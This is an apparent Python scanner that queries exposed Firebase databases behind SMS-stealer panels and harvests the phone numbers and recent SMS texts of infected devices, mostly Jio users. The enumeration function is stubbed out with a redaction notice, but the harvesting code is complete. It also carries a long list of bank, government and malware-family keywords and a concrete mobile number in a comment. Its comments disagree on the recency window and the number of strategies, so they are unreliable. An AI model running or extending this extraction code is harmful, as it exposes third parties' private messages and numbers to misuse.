"""
firebase_scanner.py — High-Speed Non-Blocking Firebase Panel Scanner v10
=========================================================================
Stage 0: Continuous Panel Dorker
Stage 1: Panel Device Scanner — MAX VOLUME extraction

Strategy (ordered by priority):
  GOLD:   user_sms / messages / sms roots — carrier SMS inboxes (real Jio SMS bodies)
  SILVER: user_list + clients + devices — SIM registration fields
  BRONZE: Deep-walk ALL clients/devices data for any 10-digit Indian mobile

Throughput optimized:
  - Returns numbers from ALL strategies combined, not just one
  - Activity recency filter: skip SMS nodes with all timestamps > 72h old
  - No artificial volume caps
"""
from __future__ import annotations
import asyncio
import random
import re
import time
from typing import Any
import aiohttp

from number_utils import (
    normalize_mobile, is_garbage, extract_sim_numbers, extract_numbers_from_messages,
    NUMBER_PATTERNS, RAW_MOBILE_PATTERN,
)

# === DORKER KEYWORDS & PATTERNS ===
DORK_KEYWORDS = [
    "sonu","rahul","raju","vikash","suresh","ramesh","rajesh","ankit","pradeep",
    "deepak","manish","rakesh","dinesh","naresh","amit","arun","ashok","vijay",
    "rohit","gaurav","kapil","pankaj","santosh","manoj","satish","harish","mahesh",
    "umesh","bablu","pappu","guddu","pintu","rinku","monty","lucky","dolly",
    "bunty","bittu","tinku","chhotu","laddu","chandu","manu","ravi","nitin",
    "lalit","mukesh","omkar","bharat","chetan","hemant","jagdish","kamlesh",
    "prem","yogesh","dhruv","farhan","gopal","hari","karan","sahil","tarun",
    "ajay","babu","lalan","ankur","sanjee","tillu","samar",
    "panel","boss","master","king","pro","data","info","control","hack","vip",
    "new","old","test","dev","main","admin","money","cash","earn","pay","loot",
    "sms","otp","rat","godpanel","darknet","craxs","vecna","alpha","flash",
    "ultra","raja","shoot","smsrat","smspanel","botpanel","xrat","spypanel",
    "pmkisan","pm-kisan","pm-modi","e-challan","echallan","rto","rtochallan",
    "yono","yono-sbi","sbi","paytm","phonepe","gpay","bhim","upi",
    "ayushman","ujjwala","mudra-loan","kisancard","pmay","digitalindia",
    "digilocker","umang","ration","aadhar","voter","pan","railway","irctc","fastag",
    "sbi-reward","axis-reward","hdfc-point","icici-offer","kotak","idfc",
    "canara","bob-reward","pnb-point","indianbank",
    "jio","myjio","jio5g","jiofiber","airtel","vi","bsnl","recharge",
    "cerberus","anubis","hydra","ermac","hook","xenomorph","sharkbot",
    "godfather","alien","flubot","teabot","sova","vultur","medusa","nexus","octo",
    "delhivery","ekart","bluedart","dtdc","amazondeliver","flipkartship",
    "instagram-verify","facebook-code","twitter-code","snapchat-otp",
    "whatsapp-code","tg-hook","telegram-otp","fast-sms",
    "gujarat","maharashtra","tamilnadu","karnataka","rajasthan","bihar",
    "jharkhand","uttarpradesh","madhyapradesh","westbengal","telangana",
    "kerala","odisha","punjab","haryana","chhattisgarh","uttarakhand",
    "delhi","mumbai","kolkata","chennai","hyderabad","bangalore","pune",
    "ahmedabad","lucknow","patna","ranchi","jaipur","bhopal",
    "grameenphone","robi","bkash","nagad","jazz","zong","easypaisa",
    "telkomsel","indosat","gopay","ncell","esewa","mpesa","safaricom",
    "usps","chase","wellsfargo","bofa","citibank","capitalone","zelle","venmo",
    "cashapp","verizon","att","tmobile","ezpass","sunpass","us-sms","us-panel",
    "zain","ooredoo","stc-kw","nbk","kfh","boubyan","burgan","knet","sahel",
    "q8-sms","kw-sms","kuwait-post",
    "server","backend","production","staging","testing","api","webhook",
    "notification","tracker","monitor","logger","recorder","capture",
    "myapp","testapp","fir","panelwala","panel-wala",
]
SUFFIXES = [
    "","-1","-2","-3","-4","-5","-6","-7","-8","-9","-10","-11","-12","-15","-20","-25","-50",
    "1","2","3","4","5","6","7","8","9",
    "-v1","-v2","-v3","-v4","-v5","-new","-old","-app","-apk","-pro","-vip",
    "-2024","-2025","-2026","-india","-jio","-data","-sms","-panel",
    "-us","-usa","-kw","-kuwait"
]
# ============================================================
#  REDACTED FOR DISCLOSURE — original contained live target
#  hostnames and a working endpoint-enumeration routine.
#  Both removed. See NOTES-REDACTION.md.
# ============================================================
DOMAINS: list[str] = []


class _RedactionNotice(RuntimeError):
    """Raised in place of the removed enumeration logic."""


def generate_candidates(count: int, seen_panels: set[str], dead_panels: set[str]) -> list[str]:
    """
    REDACTED. The original built Firebase RTDB endpoint URLs by combining
    keyword dictionaries with numeric/hex suffixes and probing each one.

    Removed for disclosure because it is the discovery primitive: given a
    domain suffix list it enumerates live third-party databases.

    The signature is preserved so callers and reviewers can see the seam.
    Intentionally returns no candidates — this module cannot enumerate.
    """
    raise _RedactionNotice(
        "generate_candidates() was removed from this disclosure copy. "
        "It enumerated live Firebase Realtime Database endpoints. "
        "See NOTES-REDACTION.md."
    )


def _generate_candidates_original(count: int, seen_panels: set[str], dead_panels: set[str]) -> list[str]:
    """
    REDACTED — body removed.

    The original resolved a hostname suffix, combined it with keyword
    dictionaries and numeric/hex suffixes, and emitted a fully-formed
    endpoint URL for probing. That construction is the enumeration
    primitive and is deliberately not reproduced here.

    The keyword lists above (DORK_KEYWORDS, SUFFIXES) are retained
    deliberately: they document WHICH organisations and services the
    reporter targeted, which is material to triage. They are inert
    without this function.
    """
    raise _RedactionNotice("Original enumeration body removed for disclosure.")


async def dorker_check(session: aiohttp.ClientSession, url: str, sem: asyncio.Semaphore, timeout: float = 2.5) -> str | None:
    async with sem:
        for path in ["/.json?shallow=true", "/clients.json?shallow=true", "/user_list.json?shallow=true"]:
            try:
                req_url = f"{url}{path}"
                async with session.get(req_url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                    if resp.status == 200:
                        data = await resp.json(content_type=None)
                        if isinstance(data, dict) and data:
                            return url
            except Exception:
                pass
    return None

EXTRA_JIO_PATTERNS = [
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)आपका\s+jio\s+नंबर\s+([6-9]\d{9})"),
    re.compile(r"(?i)(?:jio\s*mobile|jio\s*num)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)(?:recharge|plan|pack|quota)\s+.*?([6-9]\d{9})"),
    re.compile(r"(?i)\bjio\b.*?([6-9]\d{9})"),
]

COMMAND_KEYS_TO_IGNORE = frozenset({
    "action", "command", "sendSms", "send_sms", "messageText",
    "smsCommand", "makeCall", "call", "call_phone", "webhookEvent",
    "commands", "sms_forward", "adminMsg",
})

async def extract_panel_numbers(
    session: aiohttp.ClientSession,
    base_url: str,
    key: str,
    timeout: float = 4.0
) -> tuple[list[tuple[str, str]], int]:
    """
    MAX VOLUME 5-Strategy Jio Number Extractor:
    GOLD:   Carrier SMS inboxes (user_sms, messages, sms) — Jio messages with 72h recency filter.
    SILVER: SIM registration fields in user_list + clients.
    BRONZE: Deep-walk all client/device data for embedded Indian mobile numbers.
    All strategies contribute to the same result set (no early return on first hit).
    """
    auth = f"?auth={key}" if key else ""
    results: list[tuple[str, str, str]] = []  # (mobile, device_id, verified_path)
    seen: set[str] = set()
    seen_devices: set[str] = set()
    device_count = 0

    now_ms = int(time.time() * 1000)
    now_s  = int(time.time())
    cutoff_ms = 18 * 3600 * 1000   # 18 hours recency filter — preserves active devices without starvation
    cutoff_s  = 18 * 3600

    def _is_recent(val: Any) -> bool:
        try:
            ts = int(val)
            if ts > 1_000_000_000_000:
                return (now_ms - ts) < cutoff_ms
            elif ts > 1_000_000_000:
                return (now_s - ts) < cutoff_s
        except Exception:
            pass
        return True

    def _add_number(nm_raw: Any, dev_id: Any, path: str = "") -> bool:
        """ONE number per device. Returns True if added."""
        did = str(dev_id)
        if did in seen_devices:
            return False
        nm = normalize_mobile(nm_raw)
        if nm and nm not in seen and not is_garbage(nm):
            seen.add(nm)
            seen_devices.add(did)
            results.append((nm, did, path))
            return True
        return False

    def _extract_sim_number_from_device(dev_data: dict) -> str | None:
        """Extract the best genuine SIM number from a device's registration dict."""
        # 1. Check simInfo sub-object first (cleanest SIM info)
        sim_info = dev_data.get("simInfo")
        if isinstance(sim_info, dict):
            for sf in ("phoneNumber", "number", "phone", "simNumber", "msisdn"):
                nm = normalize_mobile(sim_info.get(sf, ""))
                if nm and not is_garbage(nm):
                    return nm

        # 2. If this dev_data is an admin/command queue (contains action, cmd, command, sendSms),
        # DO NOT take top-level phoneNumber/number/phone, because that's the scammer's target number!
        if any(k in dev_data for k in ("action", "command", "cmd", "sendSms", "smsCommand")):
            return None

        # 3. Top-level SIM fields for legitimate client records (e.g. user_list or clean clients)
        for field in (
            "phone_number", "phoneNumber", "simNumber", "simPhone", "sim_number",
            "ownNumber", "myNumber", "selfNumber", "mobile", "phone", "number",
            "msisdn", "sim", "sim_no",
        ):
            if field in COMMAND_KEYS_TO_IGNORE:
                continue
            nm = normalize_mobile(dev_data.get(field, ""))
            if nm and not is_garbage(nm):
                return nm
        return None

    # -------------------------------------------------------------------------
    # Prefetch user_list, clients, and registeredDevices
    # -------------------------------------------------------------------------
    clients_data: dict = {}
    user_list_data: dict = {}
    registered_devices_data: dict = {}

    async def _fetch_root(root_name: str) -> dict:
        try:
            url = f"{base_url}/{root_name}.json{auth}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status == 200:
                    d = await resp.json(content_type=None)
                    if isinstance(d, dict):
                        return d
        except Exception:
            pass
        return {}

    clients_data, user_list_data, registered_devices_data = await asyncio.gather(
        _fetch_root("clients"),
        _fetch_root("user_list"),
        _fetch_root("registeredDevices"),
    )

    # =========================================================================
    # STRATEGY 1 (GOLD): Carrier SMS inboxes (user_sms, messages, sms, smsLogs)
    # Extract numbers from incoming Jio carrier messages and cross-reference with user_list.
    # =========================================================================
    for root in ("user_sms", "messages", "sms", "smsLogs"):
        try:
            url = f"{base_url}/{root}.json{auth}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status != 200:
                    continue
                raw = await resp.json(content_type=None)
                if not isinstance(raw, dict) or not raw:
                    continue

                for idx, (dev_id, msgs) in enumerate(raw.items()):
                    if idx % 50 == 0:
                        await asyncio.sleep(0)
                    if not isinstance(msgs, dict) or not msgs:
                        continue
                    device_count += 1

                    msg_items = [m for m in msgs.values() if isinstance(m, dict)]
                    if not msg_items:
                        continue

                    # Check maximum timestamp across messages for recency
                    max_ts = None
                    for item in msg_items:
                        for ts_field in ("timestamp", "time", "ts", "date", "created_at", "id"):
                            raw_val = item.get(ts_field)
                            if raw_val is not None:
                                try:
                                    num_val = int(raw_val)
                                    s_val = num_val if num_val < 1_000_000_000_000 else num_val // 1000
                                    if max_ts is None or s_val > max_ts:
                                        max_ts = s_val
                                except Exception:
                                    pass

                    # Skip device if newest message is older than 3 hours
                    if max_ts is not None and not _is_recent(max_ts):
                        continue

                    confirmed_path = f"{base_url.rstrip('/')}/{root}/{dev_id}.json"

                    # STRICT PRIORITIZED NUMBER LIST FOR THIS DEVICE
                    candidates: list[str] = []

                    # 1. Official registered SIM info from user_list/clients
                    u_dev = user_list_data.get(dev_id)
                    if isinstance(u_dev, dict):
                        u_nm = _extract_sim_number_from_device(u_dev)
                        if u_nm:
                            candidates.append(u_nm)

                    c_dev = clients_data.get(dev_id)
                    if isinstance(c_dev, dict):
                        c_nm = _extract_sim_number_from_device(c_dev)
                        if c_nm and c_nm not in candidates:
                            candidates.append(c_nm)

                    # 2. Strict Jio patterns inside SMS text (e.g. "Jio Number: 7874006844")
                    for item in msg_items:
                        body = str(item.get("body") or item.get("message") or item.get("text") or item.get("msg") or "")
                        sender = str(item.get("sender") or item.get("from") or item.get("address") or "").lower()
                        body_lower = body.lower()
                        is_jio = (
                            any(s in sender for s in ("jio", "myji", "55333", "55444", "reliance")) or
                            any(kw in body_lower for kw in ("jio", "myjio", "reliance", "55333", "55444"))
                        )
                        if is_jio:
                            for pat in EXTRA_JIO_PATTERNS:
                                for m in pat.findall(body):
                                    norm = normalize_mobile(m)
                                    if norm and norm not in candidates and not is_garbage(norm):
                                        candidates.append(norm)

                    # Add the best candidate for this device
                    for num_cand in candidates:
                        if _add_number(num_cand, dev_id, confirmed_path):
                            break
        except Exception:
            pass

    # =========================================================================
    # STRATEGY 2 (SILVER): user_list registered SIM numbers
    # =========================================================================
    for dev_id, dev_data in user_list_data.items():
        if not isinstance(dev_data, dict):
            continue
        if dev_data.get("status") in (False, 0, "offline", "false", "inactive"):
            continue
        device_count += 1
        nm = _extract_sim_number_from_device(dev_data)
        if nm:
            _add_number(nm, dev_id, f"{base_url.rstrip('/')}/messages/{dev_id}.json")

    # =========================================================================
    # STRATEGY 3 (SILVER): clients clean records with verified SIM info
    # =========================================================================
    for dev_id, dev_data in clients_data.items():
        if not isinstance(dev_data, dict):
            continue
        if dev_data.get("status") in (False, 0, "offline", "false", "inactive"):
            continue
        # Skip scammer command queues
        if any(k in dev_data for k in ("action", "command", "cmd", "sendSms")):
            sim_info = dev_data.get("simInfo")
            if isinstance(sim_info, dict):
                nm = normalize_mobile(sim_info.get("phoneNumber") or sim_info.get("number"))
                if nm and not is_garbage(nm):
                    _add_number(nm, dev_id, f"{base_url.rstrip('/')}/clients/{dev_id}/messages.json")
            continue
        device_count += 1
        nm = _extract_sim_number_from_device(dev_data)
        if nm:
            _add_number(nm, dev_id, f"{base_url.rstrip('/')}/clients/{dev_id}/messages.json")

    # =========================================================================
    # STRATEGY 4 (PLATINUM): registeredDevices explicit SIM fields (sim1Number, sim2Number)
    # =========================================================================
    for dev_id, dev_data in registered_devices_data.items():
        if not isinstance(dev_data, dict):
            continue
        device_count += 1
        for sf in ("sim1Number", "sim2Number", "phoneNumber", "number", "simNumber"):
            raw_num = dev_data.get(sf)
            if raw_num:
                nm = normalize_mobile(raw_num)
                if nm and not is_garbage(nm):
                    _add_number(nm, dev_id, f"{base_url.rstrip('/')}/smsLogs/{dev_id}.json")

    return results, device_count



